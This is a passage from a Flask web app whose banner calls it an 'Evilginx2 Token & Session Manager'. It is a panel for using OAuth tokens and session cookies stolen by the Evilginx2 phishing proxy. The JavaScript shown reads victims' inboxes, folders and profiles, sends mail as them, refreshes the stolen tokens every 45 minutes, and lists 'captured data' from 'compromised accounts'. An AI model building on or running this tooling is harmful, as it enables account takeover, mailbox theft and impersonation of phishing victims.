                    access_token: data.raw_response.access_token,
                    refresh_token: data.raw_response.refresh_token,
                    email: data.email || data.raw_response.id_token?.email
                };
            }
            
            showMessage('Loading authentication...', 'info');
            
            const resp = await fetch('/api/load_auth', {
                method: 'POST',
                headers: {'Content-Type': 'application/json'},
                body: JSON.stringify(data)
            });
            const result = await resp.json();
            
            if (result.success) {
                showMessage('Authentication loaded! Type: ' + result.auth_type, 'success');
                authType = result.auth_type;
                if (result.token_info) {
                    emailPermissions = {
                        can_read: result.token_info.can_read_emails,
                        can_send: result.token_info.can_send_emails
                    };
                }
                displayAuthInfo(result.token_info, result.auth_type);
                await loadInbox();
                switchTab('inbox');
                
                if (result.auth_type === 'token') {
                    startAutoRefresh();
                }
            } else {
                showMessage('Error: ' + result.error, 'error');
            }
        } catch(e) {
            showMessage('Invalid JSON: ' + e.message, 'error');
        }
    }
    
    async function refreshToken() {
        if (authType !== 'token') {
            showMessage('Refresh only available for token authentication', 'warning');
            return {success: false};
        }
        
        showMessage('Refreshing token...', 'info');
        const resp = await fetch('/api/refresh_token', {method: 'POST'});
        const result = await resp.json();
        if (result.success) {
            showMessage('Token refreshed! New expiry: ' + new Date(result.expires_at).toLocaleString(), 'success');
            if (currentAuth) {
                document.getElementById('authData').value = JSON.stringify(currentAuth, null, 2);
            }
            await loadInbox();
            return {success: true};
        } else {
            showMessage('Refresh failed: ' + result.error, 'error');
            return {success: false};
        }
    }
    
    function startAutoRefresh() {
        if (autoRefreshInterval) clearInterval(autoRefreshInterval);
        autoRefreshInterval = setInterval(() => {
            refreshToken();
        }, 45 * 60 * 1000);
    }
    
    function displayAuthInfo(info, type) {
        let statusHtml = '';
        if (type === 'token') {
            if (info.can_read_emails && info.can_send_emails) {
                statusHtml = '<span class="status-badge status-online">Full Email Access ✓</span>';
            } else if (info.can_read_emails) {
                statusHtml = '<span class="status-badge status-online">Read Only ✓</span>';
            } else {
                statusHtml = '<span class="status-badge status-offline">No Email Access ✗</span>';
            }
        } else {
            statusHtml = '<span class="status-badge status-session">Session Auth (Read Only)</span>';
        }
        
        const html = `<div class="success-box">
            ✅ <strong>Authentication Active</strong> ${statusHtml}<br>
            <strong>Type:</strong> ${type === 'token' ? 'OAuth Token' : 'Session Cookies'}<br>
            <strong>User:</strong> ${escapeHtml(info.name)}<br>
            <strong>Email:</strong> ${escapeHtml(info.email)}<br>
            ${info.expires_at ? `<strong>Expires:</strong> ${new Date(info.expires_at).toLocaleString()}<br>` : ''}
            <strong>Scopes:</strong> ${escapeHtml(info.scopes.join(', '))}
        </div>`;
        document.getElementById('authInfo').innerHTML = html;
    }
    
    async function loadInbox() {
        const container = document.getElementById('inboxTab');
        container.innerHTML = '<div class="info-box">📬 Loading emails...</div>';
        
        if (!emailPermissions.can_read && authType === 'token') {
            container.innerHTML = '<div class="warning-box">⚠️ Token does not have Mail.Read permission. Cannot read emails.</div>';
            return;
        }
        
        const resp = await fetchWithCreds('/api/emails?top=50');
        const data = await resp.json();
        
        if (data.error) {
            container.innerHTML = `<div class="error-box">❌ ${escapeHtml(data.error)}</div>`;
            return;
        }
        
        if (!data.value || data.value.length === 0) {
            container.innerHTML = '<div class="info-box">📭 No emails found.</div>';
            return;
        }
        
        let html = `<div class="info-box">📬 ${data.value.length} recent emails</div>`;
        for (let email of data.value) {
            const importance = email.importance === 'high' ? '⚠️ ' : '';
            const readStatus = email.isRead ? '✓' : '●';
            html += `<div class="email-item" onclick="viewEmail('${email.id}')">
                <div class="email-subject">${readStatus} ${importance}${escapeHtml(email.subject || 'No Subject')}</div>
                <div class="email-from">📧 ${escapeHtml(email.from?.emailAddress?.name || 'Unknown')} &lt;${escapeHtml(email.from?.emailAddress?.address || '')}&gt;</div>
                <div class="email-date">📅 ${new Date(email.receivedDateTime).toLocaleString()}</div>
                <div class="email-preview">${escapeHtml((email.bodyPreview || '').substring(0, 150))}...</div>
            </div>`;
        }
        container.innerHTML = html;
    }
    
    async function viewEmail(emailId) {
        const resp = await fetchWithCreds(`/api/emails/${emailId}`);
        const email = await resp.json();
        if (email.error) {
            showMessage('Error loading email: ' + email.error, 'error');
            return;
        }
        
        const modal = document.createElement('div');
        modal.className = 'compose-modal';
        modal.style.display = 'block';
        modal.innerHTML = `
            <div class="modal-content">
                <div class="modal-header">
                    <h2>${escapeHtml(email.subject || 'No Subject')}</h2>
                    <span class="close" onclick="this.closest('.compose-modal').remove()">&times;</span>
                </div>
                <div><strong>From:</strong> ${escapeHtml(email.from?.emailAddress?.name || 'Unknown')}</div>
                <div><strong>Date:</strong> ${new Date(email.receivedDateTime).toLocaleString()}</div>
                <div><strong>To:</strong> ${email.toRecipients?.map(r => escapeHtml(r.emailAddress.address)).join(', ') || 'N/A'}</div>
                ${email.ccRecipients ? `<div><strong>CC:</strong> ${email.ccRecipients.map(r => escapeHtml(r.emailAddress.address)).join(', ')}</div>` : ''}
                <hr>
                <div>${email.body?.content || 'No content'}</div>
                <hr>
                <button class="btn" onclick="replyToEmail('${email.from?.emailAddress?.address}', '${escapeHtml(email.subject)}')">✏️ Reply</button>
            </div>
        `;
        document.body.appendChild(modal);
    }
    
    function replyToEmail(to, subject) {
        document.getElementById('composeTo').value = to;
        document.getElementById('composeSubject').value = subject.startsWith('Re:') ? subject : 'Re: ' + subject;
        openComposeModal();
    }
    
    async function loadFolders() {
        const container = document.getElementById('foldersTab');
        container.innerHTML = '<div class="info-box">📂 Loading folders...</div>';
        
        if (!emailPermissions.can_read && authType === 'token') {
            container.innerHTML = '<div class="warning-box">⚠️ Cannot load folders without Mail.Read permission.</div>';
            return;
        }
        
        const resp = await fetchWithCreds('/api/mail_folders');
        const data = await resp.json();
        
        if (data.error) {
            container.innerHTML = `<div class="error-box">❌ ${escapeHtml(data.error)}</div>`;
            return;
        }
        
        let html = '<div class="info-box">📂 Mail Folders</div>';
        for (let folder of data.value) {
            html += `<div class="result-item">
                <div class="email-subject">📁 ${escapeHtml(folder.displayName)}</div>
                <div class="email-from">Total: ${folder.totalItemCount} | Unread: ${folder.unreadItemCount}</div>
            </div>`;
        }
        container.innerHTML = html;
    }
    
    async function loadProfile() {
        const resp = await fetchWithCreds('/api/profile');
        const data = await resp.json();
        
        if (data.error) {
            document.getElementById('profileTab').innerHTML = `<div class="error-box">❌ ${escapeHtml(data.error)}</div>`;
            return;
        }
        
        let html = `<div class="result-item">
            <div class="email-subject">👤 User Profile</div>
            <div><strong>Name:</strong> ${escapeHtml(data.displayName || 'N/A')}</div>
            <div><strong>Email:</strong> ${escapeHtml(data.mail || data.userPrincipalName || 'N/A')}</div>
            <div><strong>Job Title:</strong> ${escapeHtml(data.jobTitle || 'N/A')}</div>
            <div><strong>Department:</strong> ${escapeHtml(data.department || 'N/A')}</div>
            <div><strong>Office:</strong> ${escapeHtml(data.officeLocation || 'N/A')}</div>
        </div>
        <pre>${escapeHtml(JSON.stringify(data, null, 2))}</pre>`;
        document.getElementById('profileTab').innerHTML = html;
    }
    
    async function loadScopes() {
        const resp = await fetchWithCreds('/api/scopes');
        const data = await resp.json();
        
        if (data.error) {
            document.getElementById('scopesTab').innerHTML = `<div class="error-box">❌ ${escapeHtml(data.error)}</div>`;
            return;
        }
        
        let html = `<div class="info-box">
            <strong>🔐 Authentication Type:</strong> ${data.auth_type}<br><br>
            <strong>🔐 Permissions:</strong><br>
            ${data.scopes.map(s => `• ${escapeHtml(s)}`).join('<br>')}
        </div>
        <div class="info-box">
            <strong>✅ Capabilities:</strong><br>
            ${data.capabilities.read_emails ? '✓ Read emails' : '✗ Cannot read emails'}<br>
            ${data.capabilities.send_emails ? '✓ Send emails' : '✗ Cannot send emails'}<br>
            ${data.capabilities.read_profile ? '✓ Read profile' : '✗ Cannot read profile'}<br>
            ${data.capabilities.read_users ? '✓ List users' : '✗ Cannot list users'}<br>
            ${data.capabilities.read_groups ? '✓ List groups' : '✗ Cannot list groups'}
        </div>`;
        document.getElementById('scopesTab').innerHTML = html;
    }
    
    async function showCaptured() {
        const resp = await fetch('/api/captured_data');
        const data = await resp.json();
        const html = `<div class="info-box">
            <strong>📊 Captured Data (${data.count} total):</strong><br><br>
            ${data.items.map(item => `
                <div style="margin-bottom:10px; padding:5px; background:#f0f0f0; border-radius:4px;">
                    📧 ${item.email}<br>
                    🔐 Type: ${item.auth_type}<br>
                    📅 ${new Date(item.timestamp).toLocaleString()}<br>
                    📧 Email Access: ${item.has_email_access ? 'Yes' : 'No'}
                </div>
            `).join('')}
        </div>`;
        document.getElementById('authInfo').innerHTML += html;
    }
    
    function openOutlook() {
        window.open('https://outlook.office.com/mail/inbox', '_blank');
    }
    
    function openComposeModal() {
        if (!emailPermissions.can_send && authType === 'token') {
            showMessage('Token does not have Mail.Send permission', 'warning');
            return;
        }
        if (authType !== 'token') {
            showMessage('Send email requires token authentication', 'warning');
            return;
        }
        document.getElementById('composeModal').style.display = 'block';
    }
    
    function closeComposeModal() {
        document.getElementById('composeModal').style.display = 'none';
    }
    
    document.getElementById('composeForm').addEventListener('submit', async (e) => {
        e.preventDefault();
        
        const to = [document.getElementById('composeTo').value];
        const cc = document.getElementById('composeCc').value ? [document.getElementById('composeCc').value] : [];
        
        const emailData = {
            to: to,
            cc: cc,
            subject: document.getElementById('composeSubject').value,
            body: document.getElementById('composeBody').value.replace(/\\n/g, '<br>')
        };
        
        showMessage('Sending email...', 'info');
        const resp = await fetchWithCreds('/api/emails/send', {
            method: 'POST',
            headers: {'Content-Type': 'application/json'},
            body: JSON.stringify(emailData)
        });
        const result = await resp.json();
        
        if (result.success) {
            showMessage('Email sent successfully!', 'success');
            closeComposeModal();
            document.getElementById('composeForm').reset();
        } else {
            showMessage('Failed to send: ' + result.error, 'error');
        }
    });
    
    async function switchTab(tab) {
        const activeBtn = event.target;
        document.querySelectorAll('.tab').forEach(btn => btn.classList.remove('active'));
        activeBtn.classList.add('active');
        
        document.getElementById('inboxTab').style.display = 'none';
        document.getElementById('foldersTab').style.display = 'none';
        document.getElementById('profileTab').style.display = 'none';
        document.getElementById('scopesTab').style.display = 'none';
        
        if (tab === 'inbox') {
            document.getElementById('inboxTab').style.display = 'block';
            await loadInbox();
        } else if (tab === 'folders') {
            document.getElementById('foldersTab').style.display = 'block';
            await loadFolders();
        } else if (tab === 'profile') {
            document.getElementById('profileTab').style.display = 'block';
            await loadProfile();
        } else if (tab === 'scopes') {
            document.getElementById('scopesTab').style.display = 'block';
            await loadScopes();
        }
    }
    
    function showMessage(msg, type) {
        const div = document.createElement('div');
        if (type === 'error') div.className = 'error-box';
        else if (type === 'warning') div.className = 'warning-box';
        else div.className = 'success-box';
        div.innerText = msg;
        div.style.position = 'fixed';
        div.style.top = '20px';
        div.style.right = '20px';
        div.style.zIndex = '1000';
        div.style.maxWidth = '400px';
        document.body.appendChild(div);
        setTimeout(() => div.remove(), 5000);
    }
    
    function escapeHtml(str) {
        if (!str) return '';
        return String(str).replace(/[&<>]/g, function(m) {
            if (m === '&') return '&amp;';
            if (m === '<') return '&lt;';
            if (m === '>') return '&gt;';
            return m;
        });
    }
    
    window.onclick = function(event) {
        const modal = document.getElementById('composeModal');
        if (event.target === modal) {
            modal.style.display = 'none';
        }
    }
</script>
</body>
</html>
'''

# ========== Entrypoint ==========
if __name__ == '__main__':
    # Ensure session directory exists
    os.makedirs(Config.SESSION_FILE_DIR, exist_ok=True)
    
    print("""
    ╔══════════════════════════════════════════════════════════════════════════╗
    ║         Evilginx2 Token & Session Manager - Full Email Access            ║
    ║                                                                          ║
    ║  Features:                                                              ║
    ║  • Load OAuth tokens OR session cookies from Evilginx2 capture          ║
    ║  • Read emails from compromised accounts                                ║
    ║  • Send emails (requires token with Mail.Send)                          ║
    ║  • Auto-refresh expired tokens                                          ║
    ║  • Direct Outlook Web inbox access with session forwarding              ║
    ║                                                                          ║
    ║  Evilginx2 Integration:                                                 ║
    ║  • Captures both tokens AND session cookies                             ║
    ║  • POST to /__capture_tokens                                            ║
    ║  • Supports nested token formats                                        ║
    ║                                                                          ║
    ║  Run with: python app.py                                                ║
    ╚══════════════════════════════════════════════════════════════════════════╝
    """)
    app.run(host='0.0.0.0', port=5000, debug=True)